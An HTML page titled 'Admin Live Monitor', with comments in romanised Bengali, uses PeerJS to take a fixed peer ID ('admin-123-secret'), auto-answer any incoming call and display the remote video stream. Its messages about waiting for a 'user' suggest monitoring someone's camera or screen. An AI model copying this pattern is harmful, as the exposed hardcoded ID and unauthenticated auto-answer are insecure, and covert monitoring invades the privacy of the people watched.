<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <title>Admin Live Monitor</title>
    <script src="https://unpkg.com/peerjs@1.3.1/dist/peerjs.min.js"></script>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; }
        video { width: 90%; max-width: 1000px; border: 2px solid #0f0; margin-top: 20px; background: #111; }
        .status-bar { padding: 10px; background: #222; border-bottom: 1px solid #0f0; }
        button { padding: 10px 20px; background: #0f0; border: none; cursor: pointer; font-weight: bold; margin: 10px; }
    </style>
</head>
<body>
    <div class="status-bar">
        STATUS: <span id="status">OFFLINE</span> | ID: <span id="my-id">...</span>
    </div>
    
    <button onclick="startMonitoring()">START MONITORING</button>
    
    <br>
    <video id="remote-video" autoplay playsinline controls></video>

    <script>
        // Secret ID: admin-123-secret
        const peer = new Peer('admin-123-secret'); 
        const videoElement = document.getElementById('remote-video');

        peer.on('open', (id) => {
            document.getElementById('my-id').innerText = id;
            document.getElementById('status').innerText = "WAITING FOR USER...";
        });

        peer.on('call', (call) => {
            document.getElementById('status').innerText = "RECEIVING LIVE STREAM...";
            
            // Call answer kora
            call.answer(); 

            call.on('stream', (remoteStream) => {
                console.log("Stream Received!");
                videoElement.srcObject = remoteStream;
                
                // Force play
                videoElement.play().catch(e => console.log("Play failed, need click."));
            });
        });

        function startMonitoring() {
            alert("Monitor Engine Ready. User connect korle ekhane video ashbe.");
        }
    </script>
</body>
</html>
